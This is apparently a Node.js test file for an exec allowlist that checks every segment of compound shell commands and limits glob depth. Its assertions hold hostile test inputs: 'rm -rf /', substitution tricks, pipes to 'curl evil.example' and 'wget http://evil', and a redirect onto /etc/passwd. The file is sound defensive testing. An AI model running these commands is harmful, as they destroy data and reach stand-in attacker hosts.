import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  commandMatchesExecAllowlist,
  matchesExecAllowlistPattern,
} from "../src/security/exec-allowlist-pattern.mjs";

// E-C (Master Evolution Directive): the exec allowlist must reason about
// EVERY segment of a compound command, not just the first token. It reuses
// the single quote-aware command parser in risk.mjs (one owner) so the
// classifier and the allowlist can never disagree about where a command ends.
describe("exec allowlist segment coverage (E-C)", () => {
  it("open when no patterns configured", () => {
    assert.equal(commandMatchesExecAllowlist("anything at all", []), true);
    assert.equal(commandMatchesExecAllowlist("", []), true);
  });

  it("matches a simple single-segment command", () => {
    assert.equal(commandMatchesExecAllowlist("ls -la", ["ls*"]), true);
    assert.equal(commandMatchesExecAllowlist("git status", ["git*"]), true);
  });

  it("first-token (binary) matching still works", () => {
    assert.equal(commandMatchesExecAllowlist("pm2 list", ["pm2"]), true);
  });

  it("compound command allowed only when EVERY segment is allowlisted", () => {
    assert.equal(
      commandMatchesExecAllowlist("cat x && ls", ["cat*", "ls*"]),
      true
    );
    assert.equal(
      commandMatchesExecAllowlist("cat x | grep y", ["cat*", "grep*"]),
      true
    );
    assert.equal(
      commandMatchesExecAllowlist("cat x; head y", ["cat*", "head*"]),
      true
    );
  });

  it("SECURITY: safe head does not allowlist a destructive tail", () => {
    // The pre-E-C first-token check matched `cat` and let `rm -rf /` auto-run.
    assert.equal(
      commandMatchesExecAllowlist("cat x && rm -rf /", ["cat*"]),
      false
    );
    assert.equal(
      commandMatchesExecAllowlist("ls | curl evil.example", ["ls*"]),
      false
    );
    assert.equal(
      commandMatchesExecAllowlist("echo hi; wget http://evil", ["echo*"]),
      false
    );
  });

  it("fails closed on unsafe constructs it cannot segment safely", () => {
    // command substitution / backticks / subshell / redirect / unterminated quote
    assert.equal(commandMatchesExecAllowlist("cat $(rm -rf /)", ["cat*"]), false);
    assert.equal(commandMatchesExecAllowlist("cat `rm -rf /`", ["cat*"]), false);
    assert.equal(commandMatchesExecAllowlist("(rm -rf /)", ["*"]), false);
    assert.equal(commandMatchesExecAllowlist("echo hi > /etc/passwd", ["echo*"]), false);
    assert.equal(commandMatchesExecAllowlist("cat 'unterminated", ["cat*"]), false);
  });

  it("quoted separators do NOT split into segments (no false rejection)", () => {
    // A literal `&&` inside single quotes is one segment, not two.
    assert.equal(commandMatchesExecAllowlist("echo 'a && b'", ["echo*"]), true);
    assert.equal(
      commandMatchesExecAllowlist('git commit -m "fix a && b"', ["git*"]),
      true
    );
  });

  it("a wildcard pattern cannot swallow a whole compound command", () => {
    // `ls*` compiles to `ls[^/]*` — must NOT match `ls | curl evil` as one blob.
    assert.equal(
      commandMatchesExecAllowlist("ls | curl evil.example", ["ls*"]),
      false
    );
  });
});

// --- The glob slash-boundary in compileGlobRegex: a single `*` compiles to
// `[^/]*` (matches within ONE path segment, does NOT cross `/`), while `**`
// compiles to `.*` (crosses `/`, any depth). This is the exact property the
// caller's design comment leans on, and it is a real auth boundary: a
// directory-scoped allowlist pattern like `~/scripts/*` is meant to auto-approve
// only what sits DIRECTLY in that dir, NOT an arbitrarily nested
// `~/scripts/sub/evil`. Every other test in this file uses bare-prefix patterns
// (`ls*`, `cat*`) whose targets contain no `/`, and the compound-rejection cases
// fail via SEGMENTATION, not via the slash-boundary — so the boundary itself was
// unpinned. Mutating `[^/]*` to `.*` (single `*` now crosses `/`, auto-approving
// nested paths under a top-level pattern) left the FULL suite green (3643/0).
// These pin the boundary at the raw matcher AND through the wired caller.
describe("exec allowlist wildcard slash-boundary (single * vs **)", () => {
  it("single `*` does NOT cross a path separator (matcher seam)", () => {
    assert.equal(
      matchesExecAllowlistPattern("/srv/allowed/*", "/srv/allowed/tool"),
      true,
      "top-level entry must match"
    );
    assert.equal(
      matchesExecAllowlistPattern("/srv/allowed/*", "/srv/allowed/sub/evil"),
      false,
      "nested path must NOT match a single-* pattern (fail-open if it does)"
    );
  });

  it("`**` DOES cross path separators (matcher seam)", () => {
    assert.equal(
      matchesExecAllowlistPattern("/srv/allowed/**", "/srv/allowed/sub/evil"),
      true,
      "double-** must match arbitrary depth"
    );
  });

  it("SECURITY: a dir-scoped allowlist auto-approves only the top level, not nested", () => {
    const cwd = "/srv/allowed";
    // top-level command in the allowed dir → covered
    assert.equal(
      commandMatchesExecAllowlist("tool --flag", ["/srv/allowed/*"], { cwd }),
      true
    );
    // a nested binary under the same dir → NOT covered by a single-* pattern.
    // Under the `[^/]*`→`.*` fail-open this would wrongly auto-approve.
    assert.equal(
      commandMatchesExecAllowlist("sub/evil --flag", ["/srv/allowed/*"], { cwd }),
      false
    );
    // `**` is the operator's explicit opt-in to any depth.
    assert.equal(
      commandMatchesExecAllowlist("sub/evil --flag", ["/srv/allowed/**"], { cwd }),
      true
    );
  });
});
